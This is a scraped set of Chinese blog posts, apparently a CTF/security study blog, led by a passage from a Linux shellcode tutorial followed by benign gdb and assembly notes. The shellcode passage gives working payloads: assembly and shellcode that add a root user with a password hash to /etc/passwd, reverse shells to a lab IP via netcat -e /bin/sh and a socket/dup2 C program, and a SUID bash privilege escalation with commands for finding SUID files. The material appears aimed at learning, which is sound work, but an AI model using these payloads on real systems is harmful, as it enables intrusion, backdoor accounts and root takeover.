; OS will handle closing fd at exitget_entry_address:call write_entryuser_entry: db &quot;toor:sXuCKi7k3Xh/s:0:0::/root:/bin/sh&quot;,0xa_push_filename:call _openfilepath: db &quot;/etc/passwd&quot;/*sakura@Kylin:~/文档/execveDir$ gcc -c addRootUser.c -o addRootUser.osakura@Kylin:~/文档/execveDir$ gcc addRootUser.o -o addRootUser -staticUsage:akura@Kylin:~/文档/execveDir$ nasm -f elf64 addRootUser.asm sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 addRootUser.o -o addRootUsersakura@Kylin:~/文档/execveDir$ ./addRootUsersakura@Kylin:~/文档/execveDir$ for i in $(objdump -d addRootUser.o | grep &quot;^ &quot; | cut -f2); do echo -n &#x27;\\x&#x27;$i; done; echo *///注意：上面这个程序，编译后需要以root权限来执行，否则没有效果。至于提权，，目前还没有思路。。//提权思路：在系统文件中找到一个具有777权限的文件，在里面写入我们的提权代码执行，或者是把我们的可执行文件，提升权限执行。/*#include &lt;stdio.h&gt;int main()&#123; unsigned char shellcode[] = \\&quot;\\xeb\\x4c\\x5f\\x48\\x31\\xc0\\x48\\x31\\xf6\\x66\\xbe\\x01\\x04\\x04\\x02\\x0f\\x05\\x48\\x97\\xeb\\x0e\\x5e\\x6a\\x01\\x58\\x6a\\x26\\x5a\\x0f\\x05\\x6a\\x3c\\x58\\x0f\\x05\\xe8\\xed\\xff\\xff\\xff\\x74\\x6f\\x6f\\x72\\x3a\\x73\\x58\\x75\\x43\\x4b\\x69\\x37\\x6b\\x33\\x58\\x68\\x2f\\x73\\x3a\\x30\\x3a\\x30\\x3a\\x3a\\x2f\\x72\\x6f\\x6f\\x74\\x3a\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x0a\\xe8\\xaf\\xff\\xff\\xff\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64&quot;; int (*ret)() = (int(*)())shellcode; ret();&#125;*//*Usage:sakura@Kylin:~/文档/execveDir$ gcc addRootUser.c -o addRootUser -fno-stack-protector -z execstack -wsakura@Kylin:~/文档/execveDir$ sudo ./addRootUser*/ 5 反向shell 参考： ​ 反弹shell原理与实现 ​ IP地址如何用十六进制表示 ​ Linux/x86-64 - Dynamic null-free reverse TCP shell - 65 bytes ​ FreeBSD/x86 - reverse connect dl(shellcode) and execute, exit - 90 bytes ​ Linux/x86-64 - Password Protected Reverse Shell - 136 bytes ​ Linux/x86-64 - Reverse TCP shell - 118 bytes ​ 反弹Shell原理及检测技术研究 ​ 使用netcat进行反弹链接的shellcode 5.1 先通过命令来反弹shell 【1】先在攻击端（kali: 192.168.188.141）输入以下命令。 【2】然后在靶机端（Kylin：192.168.188.146）输入以下命令。 不过这种 shell 命令，在用execve中运行会找不到这个 /dev/tcp/... 文件，因此我们只能在靶机端运行 nc 命令：netcat -e /bin/sh 192.168.188.141 5566 但是，如果你直接在 kylin 中运行上面这条命令的话，它会报错显示没有 -e 这条参数。这样就需要我们装一个完整的 netcat，然后再来执行上面这条命令。我将它安装在/home/sakura/tools/netcat 安装教程：这可能是netcat最全的使用指南 5.2 再来用C语言来试试：（可以运行） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include&lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; char *name[6]; name[0] = &quot;/home/sakura/tools/netcat/src/netcat&quot;; name[1] = &quot;-e&quot;; name[2] = &quot;/bin/sh&quot;; name[3] = &quot;192.168.188.141&quot;; name[4] = &quot;5566&quot;; name[5] = 0x0; execve(name[0], name, NULL); exit(0);&#125;/*sakura@Kylin:~/文档/execveDir$ gcc -c rev_tcp.c -o rev_tcp.osakura@Kylin:~/文档/execveDir$ gcc rev_tcp.o -o rev_tcp -staticsakura@Kylin:~/文档/execveDir$ objdump -sd rev_tcp.o -M intelrev_tcp.o： 文件格式 elf64-x86-64Contents of section .text: 0000 f30f1efa 554889e5 4883ec40 64488b04 ....UH..H..@dH.. 0010 25280000 00488945 f831c048 8d050000 %(...H.E.1.H.... 0020 00004889 45c0488d 05000000 00488945 ..H.E.H......H.E 0030 c8488d05 00000000 488945d0 488d0500 .H......H.E.H... 0040 00000048 8945d848 8d050000 00004889 ...H.E.H......H. 0050 45e048c7 45e80000 0000488b 45c0488d E.H.E.....H.E.H. 0060 4dc0ba00 00000048 89ce4889 c7e80000 M......H..H..... 0070 0000bf00 000000e8 00000000 ............ Contents of section .rodata: 0000 2f686f6d 652f7361 6b757261 2f746f6f /home/sakura/too 0010 6c732f6e 65746361 742f7372 632f6e65 ls/netcat/src/ne 0020 74636174 002d6500 2f62696e 2f736800 tcat.-e./bin/sh. 0030 3139322e 3136382e 3138382e 31343100 192.168.188.141. 0040 35353636 00 5566. Contents of section .comment: 0000 00474343 3a202855 62756e74 7520392e .GCC: (Ubuntu 9. 0010 332e302d 31306b79 6c696e32 2920392e 3.0-10kylin2) 9. 0020 332e3000 3.0. Contents of section .note.gnu.property: 0000 04000000 10000000 05000000 474e5500 ............GNU. 0010 020000c0 04000000 03000000 00000000 ................Contents of section .eh_frame: 0000 14000000 00000000 017a5200 01781001 .........zR..x.. 0010 1b0c0708 90010000 1c000000 1c000000 ................ 0020 00000000 7c000000 00450e10 8602430d ....|....E....C. 0030 06000000 00000000 ........ Disassembly of section .text:0000000000000000 &lt;main&gt;: 0: f3 0f 1e fa endbr64 4: 55 push rbp 5: 48 89 e5 mov rbp,rsp 8: 48 83 ec 40 sub rsp,0x40 c: 64 48 8b 04 25 28 00 mov rax,QWORD PTR fs:0x28 13: 00 00 15: 48 89 45 f8 mov QWORD PTR [rbp-0x8],rax 19: 31 c0 xor eax,eax 1b: 48 8d 05 00 00 00 00 lea rax,[rip+0x0] # 22 &lt;main+0x22&gt; 22: 48 89 45 c0 mov QWORD PTR [rbp-0x40],rax 26: 48 8d 05 00 00 00 00 lea rax,[rip+0x0] # 2d &lt;main+0x2d&gt; 2d: 48 89 45 c8 mov QWORD PTR [rbp-0x38],rax 31: 48 8d 05 00 00 00 00 lea rax,[rip+0x0] # 38 &lt;main+0x38&gt; 38: 48 89 45 d0 mov QWORD PTR [rbp-0x30],rax 3c: 48 8d 05 00 00 00 00 lea rax,[rip+0x0] # 43 &lt;main+0x43&gt; 43: 48 89 45 d8 mov QWORD PTR [rbp-0x28],rax 47: 48 8d 05 00 00 00 00 lea rax,[rip+0x0] # 4e &lt;main+0x4e&gt; 4e: 48 89 45 e0 mov QWORD PTR [rbp-0x20],rax 52: 48 c7 45 e8 00 00 00 mov QWORD PTR [rbp-0x18],0x0 59: 00 5a: 48 8b 45 c0 mov rax,QWORD PTR [rbp-0x40] 5e: 48 8d 4d c0 lea rcx,[rbp-0x40] 62: ba 00 00 00 00 mov edx,0x0 67: 48 89 ce mov rsi,rcx 6a: 48 89 c7 mov rdi,rax 6d: e8 00 00 00 00 call 72 &lt;main+0x72&gt; 72: bf 00 00 00 00 mov edi,0x0 77: e8 00 00 00 00 call 7c &lt;main+0x7c&gt;sakura@Kylin:~/文档/execveDir$ */ 5.3 然后我们用汇编来写 execve 调用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182;execve(&quot;/home/sakura/tools/netcat/src/netcat&quot;, [&quot;/home/sakura/tools/netcat/src/ne&quot;..., &quot;-e&quot;, &quot;/bin/sh&quot;, &quot;192.168.188.141&quot;, &quot;5566&quot;], NULL) = 0global _startsection .text_start: push rbp mov rbp, rsp sub rsp, 0x40 mov qword rax, &#x27;5566AAAA&#x27; push rax mov qword rax, &#x27;188.141A&#x27; push rax mov qword rax, &#x27;192.168.&#x27; push rax mov qword rax, &#x27;/bin/shA&#x27; push rax mov qword rax, &#x27;tcatA-eA&#x27; push rax mov qword rax, &#x27;t/src/ne&#x27; push rax mov qword rax, &#x27;ls/netca&#x27; push rax mov qword rax, &#x27;kura/too&#x27; push rax mov qword rax, &#x27;/home/sa&#x27; push rax xor byte [rsp+36], 0x41 xor byte [rsp+39], 0x41 xor byte [rsp+47], 0x41 xor byte [rsp+63], 0x41 xor byte [rsp+71], 0x41 xor byte [rsp+70], 0x41 xor byte [rsp+69], 0x41 xor byte [rsp+68], 0x41 xor rax, rax mov rdi, rsp push rax lea rbx, [rdi+64] push rbx lea rbx, [rdi+48] push rbx lea rbx, [rdi+40] push rbx lea rbx, [rdi+37] push rbx push rdi mov rsi, rsp xor rdx, rdx add al , 59 syscall ;/home/sa kura/too ls/netca t/src/ne tcatAAAA ;-eAAAAAA /bin/shA 192.168. 188.141A 5566AAAA&quot; /*Usage:akura@Kylin:~/文档/execveDir$ nasm -f elf64 rev_tcp.asm sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 rev_tcp.o -o rev_tcpsakura@Kylin:~/文档/execveDir$ ./rev_tcpsakura@Kylin:~/文档/execveDir$ for i in $(objdump -d rev_tcp.o | grep &quot;^ &quot; | cut -f2); do echo -n &#x27;\\x&#x27;$i; done; echo *//*#include &lt;stdio.h&gt;int main()&#123; unsigned char shellcode[] = \\&quot;\\x55\\x48\\x89\\xe5\\x48\\x83\\xec\\x40\\x48\\xb8\\x35\\x35\\x36\\x36\\x41\\x41\\x41\\x41\\x50\\x48\\xb8\\x31\\x38\\x38\\x2e\\x31\\x34\\x31\\x41\\x50\\x48\\xb8\\x31\\x39\\x32\\x2e\\x31\\x36\\x38\\x2e\\x50\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x41\\x50\\x48\\xb8\\x74\\x63\\x61\\x74\\x41\\x2d\\x65\\x41\\x50\\x48\\xb8\\x74\\x2f\\x73\\x72\\x63\\x2f\\x6e\\x65\\x50\\x48\\xb8\\x6c\\x73\\x2f\\x6e\\x65\\x74\\x63\\x61\\x50\\x48\\xb8\\x6b\\x75\\x72\\x61\\x2f\\x74\\x6f\\x6f\\x50\\x48\\xb8\\x2f\\x68\\x6f\\x6d\\x65\\x2f\\x73\\x61\\x50\\x80\\x74\\x24\\x24\\x41\\x80\\x74\\x24\\x27\\x41\\x80\\x74\\x24\\x2f\\x41\\x80\\x74\\x24\\x3f\\x41\\x80\\x74\\x24\\x47\\x41\\x80\\x74\\x24\\x46\\x41\\x80\\x74\\x24\\x45\\x41\\x80\\x74\\x24\\x44\\x41\\x48\\x31\\xc0\\x48\\x89\\xe7\\x50\\x48\\x8d\\x5f\\x40\\x53\\x48\\x8d\\x5f\\x30\\x53\\x48\\x8d\\x5f\\x28\\x53\\x48\\x8d\\x5f\\x25\\x53\\x57\\x48\\x89\\xe6\\x48\\x31\\xd2\\x04\\x3b\\x0f\\x05&quot;; int (*ret)() = (int(*)())shellcode; ret();&#125;*//*Usage:sakura@Kylin:~/文档/execveDir$ gcc rev_tcp.c -o rev_tcp -fno-stack-protector -z execstack -wsakura@Kylin:~/文档/execveDir$ ./rev_tcp*/ 5.4 用系统调用建立连接来反弹shell 这种方法似乎绕不过 iptable，不建议使用。 12345678910111213141516171819202122#include&lt;stddef.h&gt;#include&lt;sys/socket.h&gt; //构造socket所需的库#include&lt;netinet/in.h&gt; //定义sockaddr结构int main()&#123; char *shell[2]; //用于execv调用 int soc,remote; //文件描述符句柄 struct sockaddr_in serv_addr; //保存IP/端口值的结构 //192.168.188.141--&gt;0x8dbca8c0 serv_addr.sin_addr.s_addr=0x8dbca8c0; //将socket的地址设置为所有本地地址 serv_addr.sin_port=0x15be; //设置socket的端口5566 serv_addr.sin_family=2; //设置协议族：IP soc=socket(2,1,0); remote=connect(soc,(struct sockaddr *)&amp;serv_addr,0x10); dup2(soc,0); //将stdin连接client dup2(soc,1); //将stdout连接client dup2(soc,2); //将strderr连接到client shell[0]=&quot;/bin/sh&quot;; //execve的第一个参数 shell[1]=0; //数组的第二个元素为NULL,表示数组结束 execv(shell[0],shell,NULL); //建立一个shell&#125; 6 提权 参考： ​ Linux chown命令：修改文件和目录的所有者和所属组 ​ 出现 “ /usr/bin/ld: cannot open output file a.out: Permission denied ” 的解决办法 ​ 解决链接器错误 - 权限被拒绝 ​ 6.1 尝试 前面不是说了一种提权思路吗？ 提权思路：在系统文件中找到一个具有777权限的文件，在里面写入我们的提权代码执行，或者是把我们的可执行文件，提升权限执行。 我在实现的时候，却发现，只有777权限还不行，提示权限不够。 按照这篇文章《出现 “ /usr/bin/ld: cannot open output file a.out: Permission denied ” 的解决办法》所说这是因为，user 用户无权更改所有者为 root 用户文件。所以我们还需要更改文件的所有者。Linux chown命令：修改文件和目录的所有者和所属组 但是更改文件所有者，还是需要 root 权限。更改后，，，还是缺少权限。 结果我按照那篇文章的说法，把整个目录的所有者都改成了 sakura，然后就能成功编译了。但是还是无法执行，因为目录中的所有文件所有者都变成了 sakura，所以同时文件的所有者也变成了 sakura。 最后，我看到了这篇文章《解决链接器错误 - 权限被拒绝》，说是要解决此问题，请确保程序编译所在的目录具有所需的写入权限。 strace 跟踪还是缺少权限。 6.2 suid 提权 参考： linux——SUID提权 ​ 谈一谈Linux与suid提权 说到这个话题，我们不得不先介绍一下suid。 通常来说，Linux运行一个程序，是使用当前运行这个程序的用户权限，这当然是合理的。但是有一些程序比较特殊，比如我们常用的ping命令。 ping需要发送ICMP报文，而这个操作需要发送Raw Socket。在Linux 2.2引入CAPABILITIES前，使用Raw Socket是需要root权限的（当然不是说引入CAPABILITIES就不需要权限了，而是可以通过其他方法解决，这个后说），所以你如果在一些老的系统里ls -al $(which ping)，可以发现其权限是-rwsr-xr-x，其中有个s位，这就是suid： 12root@linux:~# ls -al /bin/ping-rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping suid全称是Set owner User ID up on execution。这是Linux给可执行文件的一个属性，上述情况下，普通用户之所以也可以使用ping命令，原因就在我们给ping这个可执行文件设置了suid权限。 设置了s位的程序在运行时，其Effective UID将会设置为这个程序的所有者。比如，/bin/ping这个程序的所有者是0（root），它设置了s位，那么普通用户在运行ping时其Effective UID就是0，等同于拥有了root权限。 这里引入了一个新的概念Effective UID。Linux进程在运行时有三个UID： Real UID 执行该进程的用户实际的UID Effective UID 程序实际操作时生效的UID（比如写入文件时，系统会检查这个UID是否有权限） Saved UID 在高权限用户降权后，保留的其原本UID（本文中不对这个UID进行深入探讨） 通常情况下Effective UID和Real UID相等，所以普通用户不能写入只有UID=0号才可写的/etc/passwd；有suid的程序启动时，Effective UID就等于二进制文件的所有者，此时Real UID就可能和Effective UID不相等了。 有的同学说某某程序只要有suid权限，就可以提权，这个说法其实是不准确的。只有这个程序的所有者是0号或其他super user，同时拥有suid权限，才可以提权。 SUID提权的思路：运行root用户所拥有的SUID的文件，当其他用户运行该文件的时候就得获得root用户的身份。 如下： 1234567891011121314sakura@Kylin:~$ sudo chmod u+s /bin/bashsakura@Kylin:~$ ll /bin/bash-rwsr-xr-x 1 root root 1183448 6月 4 2021 /bin/bash*sakura@Kylin:~$ bash -pbash-5.0# whoamirootbash-5.0# iduid=1000(sakura) gid=1000(sakura) euid=0(root) 组=1000(sakura),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),119(lpadmin),129(sambashare)bash-5.0# ./addRootUser bash-5.0# cat /etc/passwdroot:x:0:0:root:/root:/bin/bash。。。。。。toor:sXuCKi7k3Xh/s:0:0::/root:/bin/shbash-5.0# 成功提权，可以看到，最后已经添加了 具有root权限的 toor 用户。 以下命令可以发现linux系统上所有SUID的可执行文件 1234//以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试find / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000-print2&gt;/del/nullfind / -user root -perm -4000-exec ls -ldb &#123;&#125; \\; 参考： ​ Linux x86_64系统调用简介 ​ syscall大全 ​ Shellcodes database for study cases ​ Exploit Database Shellcodes ​ 《UNIX环境高级编程第3版》","categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.rgzzplus.com/categories/CTF/"}],"tags":[{"name":"shellcode","slug":"shellcode","permalink":"https://www.rgzzplus.com/tags/shellcode/"}]},{"title":"gdb显示intel和at&t汇编","slug":"gdb显示intel和att汇编","date":"2022-08-08T14:36:22.000Z","updated":"2022-08-08T14:38:19.182Z","comments":true,"path":"2022/08/08/gdb显示intel和att汇编/","link":"","permalink":"https://www.rgzzplus.com/2022/08/08/gdb%E6%98%BE%E7%A4%BAintel%E5%92%8Catt%E6%B1%87%E7%BC%96/","excerpt":"","text":"本文转载自：Linux下gdb显示intel和at&amp;t汇编 在windows下使用习惯了intel汇编，在Linux下看的难受，在gdb下使用 set disassembly-flavor intel 转换为intel格式的汇编 set disassembly-flavor att 转换为att格式的汇编","categories":[{"name":"转载","slug":"转载","permalink":"https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"}],"tags":[{"name":"gdb","slug":"gdb","permalink":"https://www.rgzzplus.com/tags/gdb/"}]},{"title":"gdb调试带参程序","slug":"gdb调试带参程序","date":"2022-08-08T14:33:41.000Z","updated":"2022-08-08T14:36:56.316Z","comments":true,"path":"2022/08/08/gdb调试带参程序/","link":"","permalink":"https://www.rgzzplus.com/2022/08/08/gdb%E8%B0%83%E8%AF%95%E5%B8%A6%E5%8F%82%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"本文转载自：gdb调试带参数程序 具体来说就是 例如一个程序名为prog 参数为 -l a -C abc 则，运行gcc/g++ -g prog.c/cpp -o prog 就可以用gdb调试程序prog #gdb prog 进入gdb调试界面 输入参数命令set args 后面加上程序所要用的参数，注意，不再带有程序名，直接加参数，如： set args -l a -C abc 回车后输入 r 即可开始","categories":[{"name":"转载","slug":"转载","permalink":"https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"}],"tags":[{"name":"gdb","slug":"gdb","permalink":"https://www.rgzzplus.com/tags/gdb/"}]},{"title":"gdb插件自动切换","slug":"gdb插件自动切换","date":"2022-08-08T14:31:58.000Z","updated":"2022-08-08T14:49:08.833Z","comments":true,"path":"2022/08/08/gdb插件自动切换/","link":"","permalink":"https://www.rgzzplus.com/2022/08/08/gdb%E6%8F%92%E4%BB%B6%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2/","excerpt":"","text":"本文转载自：gdb 的配置、插件plugin与多彩显示 PwnDbg、gef、peda 的自动切换，其实就是切换配置文件： 先把他们全部装上，当然你可以选择自己感兴趣的安装，他们的配置都需要通过 ~/.gdbinit 来配置，因此他们是互斥的，配置里只能配置一种，但是可以用下面的这种方法解决，下面的示例只写了 peda、PwnDbg和gef，其它自己加。 1、Open your .gdbinit file, delete any contents and paste the following configuration: 1234567891011121314151617181920define init-pedasource ~/peda/peda.pyenddocument init-pedaInitializes the PEDA (Python Exploit Development Assistant for GDB) frameworkenddefine init-pwndbgsource ~/.gdbinit_pwndbgenddocument init-pwndbgInitializes PwnDBGenddefine init-gefsource ~/.gdbinit-gef.pyenddocument init-gefInitializes GEF (GDB Enhanced Features)end Then, create the following 3 files in one of your $PATH folder: 然后，分别创建下列三个文件在你的 $PATH 文件夹中（查看$PATH文件夹命令：echo $PATH）： First create a file named by gdb-peda and paste the following: 首先创建一个名为 gdb-peda 的文件，并将下列内容复制进去： 创建文件指令：sudo touch gdb-peda 12#!/bin/shexec gdb -q -ex init-peda &quot;$@&quot; Then gdb-pwndbg: 然后是 gdb-pwndbg: 12#!/bin/shexec gdb -q -ex init-pwndbg &quot;$@&quot; Then gdb-gef: 然后是 gdb-gef： 12#!/bin/shexec gdb -q -ex init-gef &quot;$@&quot; 最后分别修改它们的可执行权限：（注：gdb-* 代表 gdb-gef、gdb-peda、gdb-pwndbg） 1chmod +x /usr/bin/gdb-* 然后你就可以使用 gdb-peda, gdb-pwndbg 或 gdb-gef 来运行相应的gdb plugin版了。","categories":[{"name":"转载","slug":"转载","permalink":"https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"}],"tags":[{"name":"gdb","slug":"gdb","permalink":"https://www.rgzzplus.com/tags/gdb/"}]},{"title":"Linux汇编之伪指令","slug":"Linux汇编之伪指令","date":"2022-08-05T12:56:04.000Z","updated":"2022-08-05T13:12:06.936Z","comments":true,"path":"2022/08/05/Linux汇编之伪指令/","link":"","permalink":"https://www.rgzzplus.com/2022/08/05/Linux%E6%B1%87%E7%BC%96%E4%B9%8B%E4%BC%AA%E6%8C%87%E4%BB%A4/","excerpt":"","text":"作者：Reesun 链接：http://blog.chinaunix.net/uid-20548989-id-1667484.html 来源：Chinaunix 示例： 123456789101112131415161718.datamsg: .ascii &quot;hello 32-bit!\\n&quot; len = . - msg .text .global _start_start: movl $1, %rdi movl $msg, %rsi movl $1, %rdx movl $4, %rax syscall xorq %rdi, %rdi movq $60, %rax syscall 1.section .data 汇编程序中以.开头的名称并不是指令的助记符，不会被翻译成机器指令，而是给汇编器一些特殊指示，称为汇编指示（Assembler Directive）或伪操作（Pseudo-operation），由于它不是真正的指令所以加个“伪”字。.section指示把代码划分成若干个段（Section），程序被操作系统加载执行时，每个段被加载到不同的地址，操作系统对不同的页面设置不同的读、写、执行权限。 .data段保存程序的数据，是可读可写的，相当于C程序的全局变量。 1.section .text .text段保存代码，是只读和可执行的，后面那些指令都属于.text段。 1.globl _start _start是一个符号（Symbol），符号在汇编程序中代表一个地址，可以用在指令中，汇编程序经过汇编器的处理之后，所有的符号都被替换成它所代表的地址值。在C语言中我们通过变量名访问一个变量，其实就是读写某个地址的内存单元，我们通过函数名调用一个函数，其实就是跳转到该函数第一条指令所在的地址，所以变量名和函数名都是符号，本质上是代表内存地址的。 .globl指示告诉汇编器，_start这个符号要被链接器用到，所以要在目标文件的符号表中标记它是一个全局符号（在第 5.1 节 “目标文件”详细解释）。_start就像C程序的main函数一样特殊，是整个程序的入口，链接器在链接时会查找目标文件中的_start符号代表的地址，把它设置为整个程序的入口地址，所以每个汇编程序都要提供一个_start符号并且用.globl声明。如果一个符号没有用.globl声明，就表示这个符号不会被链接器用到。 1_start: 这里定义了_start符号，汇编器在翻译汇编程序时会计算每个数据对象和每条指令的地址，当看到这样一个符号定义时，就把它后面一条指令的地址作为这个符号所代表的地址。而_start这个符号又比较特殊，它所代表的地址是整个程序的入口地址，所以下一条指令movl $1, %rdi就成了程序中第一条被执行的指令。","categories":[{"name":"转载","slug":"转载","permalink":"https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"}],"tags":[{"name":"Linux汇编伪指令","slug":"Linux汇编伪指令","permalink":"https://www.rgzzplus.com/tags/Linux%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4/"}]},{"title":"Linux—shellcode开发入门","slug":"Linux-shellcode开发入门","date":"2022-08-05T12:48:42.000Z","updated":"2022-08-08T14:40:18.770Z","comments":true,"path":"2022/08/05/Linux-shellcode开发入门/","link":"","permalink":"https://www.rgzzplus.com/2022/08/05/Linux-shellcode%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/","excerpt":"","text":"[toc] 1. 什么是 shellcode ？ shellcode 通常用机器语言编写，是一段用于软件漏洞而执行的代码，因其目的常常是让攻击者获得目标机器的命令行 shell 而得名。随着发展，shellcode 现在代表将插入到漏洞利用程序中以完成所需任务的任何字节码。 2. shellcode 原理 2.1 理解系统调用 shellcode 通常是一段能够执行某些系统调用的代码，所以直接通过一个int 0x80系统调用，指定想调用的函数的系统调用号（syscall），传入调用函数的参数，即可。 Linux 操作系统（2.6及更早的内核版本），通常用 int $0x80软中断 + 系统调用号（保存到eax中）来实现系统调用，其参数传递顺序依次为 ebx、ecx、edx、esi和edi，返回值存放在eax。 123456789101112131415161718.datamsg: .ascii &quot;hello 32-bit!\\n&quot; len = . - msg .text .global _start_start: movl $len, %edx movl $msg, %ecx movl $1, %ebx movl $4, %eax int $0x80 movl $0, %ebx movl $1, %eax int $0x80 编译执行（可编译成 64 位程序）：用gcc编译，生成目标文件，用ld来链接 123456789$ gcc -m32 -c hello32.S$ ld -m elf_i386 -o hello32 hello32.o$ strace ./hello32 127 ⨯execve(&quot;./hello32&quot;, [&quot;./hello32&quot;], 0x7ffd941ae900 /* 61 vars */) = 0[ Process PID=3197 runs in 32 bit mode. ]write(1, &quot;hello 32-bit!\\n&quot;, 14hello 32-bit!) = 14exit(0) = ?+++ exited with 0 +++ 虽然软中断 int 0x80 非常经典，但是由于其性能较差，在往后的内核中被快速调用指令代替，32 位系统使用 sysenter(对应 sysexit)指令，64 位系统则使用 syscall（对应 sysret）指令。 2.2 调用约定 调用约定是对函数调用时如何传递参数的一种约定。 （1）内核接口 x86-32 系统调用约定：Linux系统调用使用寄存器传递参数。eax 存放系统调用号（syscall_number），ebx、ecx、edx、esi 和 ebp 用于将6个参数传递给系统调用。返回值保存在 eax 中。所有其它寄存器（包括 EFLAGS）都保存在 int 0x80 中。 x86-64 系统调用约定：系统调用的参数限制为 6 个，不直接从堆栈上传递任何参数。==rax 存放系统调用号（syscall_namber）。内核接口使用的寄存器有 rdi、rsi、rdx、r10、r8 和 r9。==系统调用通过 syscall 指令完成。除了 rcx、r11 和 eax，其它寄存器都被保留。返回值保存在 rax 中，只有 INTEGER 或者 MEMORY 类型的值才会被传递给内核。、 （2）用户接口 x86-32 函数调用约定：参数通过栈进行传递。最后一个参数第一个被放入栈中，知道所有的参数都放置完毕，然后执行 call 指令。 x86-64 函数调用约定：x86-64 下通过寄存器传递参数，这样做比栈更有效率。它避免了内存中参数的存取和额外的指令。根据参数类型的不同，会使用寄存器或传参方式。如果参数类型是 MEMORY，则在栈上传递参数。如果类型是 INTEGER，则==顺序使用 rdi、rsi、rdx、rcx、r8 和 r9。==如果多于 6 个参数，则后面的参数将在栈中传递。 2.2 *32位程序使用 sysenter 的例子 12345678910111213141516171819202122232425262728293031.datamsg: .ascii &quot;Hello sysenter!\\n&quot; len = . - msg .text .globl _start_start: movl $len, %edx movl $msg, %ecx movl $1, %ebx movl $4, %eax #为sysenter布置栈 pushl $sysenter_ret pushl %ecx pushl %edx pushl %ebp movl %esp,%ebp sysenter sysenter_ret: movl $0, %ebx movl $1, %eax #为sysenter布置栈 pushl $sysenter_ret pushl %ecx pushl %edx pushl %ebp movl %esp,%ebp sysenter 可以看到，为了使用 sysenter 指令，需要手动为其布置栈。这是因为 sysenter 返回时，会执行 _kernel_vsyscall 的后半部分（从 0xf7fd5059 开始）。_kernel_vsyscall 封装了 sysenter 调用的规范，是 vDSO 的一部分，而 vDSO 运行程序在用户层中执行代码。 1234567891011gdb-peda$ disasseble __kernel_vsyscall 0xf7fd5050 &lt;+0&gt;: push ecx 0xf7fd5051 &lt;+1&gt;: push edx 0xf7fd5052 &lt;+2&gt;: push ebp 0xf7fd5053 &lt;+3&gt;: mov ebp,esp 0xf7fd5055 &lt;+5&gt;: sysenter 0xf7fd5057 &lt;+7&gt;: int 0x80--&gt; 0xf7fd5059 &lt;+9&gt;: pop ebp 0xf7fd505a &lt;+10&gt;: pop edx 0xf7fd505b &lt;+11&gt;: pop ecx 0xf7fd505c &lt;+12&gt;: ret 编译执行（不可编译成 64 位程序） 123456789$ gcc -m32 -c sysenter32.S$ ld -m elf_i386 -o sysenter sysenter32.o$ strace ./sysenterexecve(&quot;./sysenter&quot;, [&quot;./sysenter&quot;], 0x7ffe74dda6e0 /* 61 vars */) = 0[ Process PID=3638 runs in 32 bit mode. ]write(1, &quot;Hello sysenter!\\n&quot;, 16Hello sysenter!) = 16exit(0) = ?+++ exited with 0 +++ 2.3 *64位程序使用 syscall 的例子 123456789101112131415161718.datamsg: .ascii &quot;hello 32-bit!\\n&quot; len = . - msg .text .global _start_start: movl $1, %rdi movl $msg, %rsi movl $1, %rdx movl $4, %rax syscall xorq %rdi, %rdi movq $60, %rax syscall 编译执行（不可编译成 32 位程序） 12345678$ gcc -c hello64.S $ ld -o hello64 hello64.o$ strace ./hello64 execve(&quot;./hello64&quot;, [&quot;./hello64&quot;], 0x7fffe7d694a0 /* 61 vars */) = 0write(1, &quot;hello 64-bit!\\n&quot;, 14hello 64-bit!) = 14exit(0) = ?+++ exited with 0 +++ 3. 编写简单 shellcode shellcode 只是一段代码，为了运行和验证，我们通常用函数指针或者内联函数的方式把它嵌入到C程序中来调用。 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;char shellcode[] = &quot;&quot;;int main()&#123; //当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度 printf(&quot;Shellcode length: %d bytes\\n&quot;,strlen(shellcode)); (*(void(*)())shellcode)(); //污染所有寄存器，确保shellcode 在任何环境下都能运行 /* __asm__( &quot;mov %eax, %ebx\\n\\t&quot; &quot;mov %eax, %ecx\\n\\t&quot; &quot;mov %eax, %edx\\n\\t&quot; &quot;mov %eax, %esi\\n\\t&quot; &quot;mov %eax, %edi\\n\\t&quot; &quot;mov %eax, %ebp\\n\\t&quot; &quot;call shellcode&quot;); */&#125; 在 shell-storm找一些 shellcode 学习案例，先看一个实现 execve(&quot;/bin/sh&quot;) 的 Linux 32位的程序。 1234567891011121314global _startsection .text_start: ; int execve(const char *filename, char *const argv[], char *const envp[]) xor ecx, ecx ; ecx = NULL mul ecx ; eax and edx = NULL mov al, 11 ; execve syscall push ecx ; string NULL push 0x68732f2f ; &quot;//sh&quot; push 0x6e69622f ; &quot;/bin&quot; mov ebx, esp ; pointer to &quot;/bin/sh\\0&quot; string int 0x80 ; bingo 首先用 NASM 对这段汇编代码进行编译，然后使用 ld 链接，运行后获得shell 1234567891011121314151617$ nasm -f elf32 tiny_execve_sh.asm$ ld -m elf_i386 tiny_execve_sh.o -o tiny_execve_sh $ ./tiny_execve_sh $ objdump -d tiny_execve_sh \\ 127 ⨯tiny_execve_sh： 文件格式 elf32-i386Disassembly of section .text:08049000 &lt;_start&gt;: 8049000: 31 c9 xor %ecx,%ecx 8049002: f7 e1 mul %ecx 8049004: b0 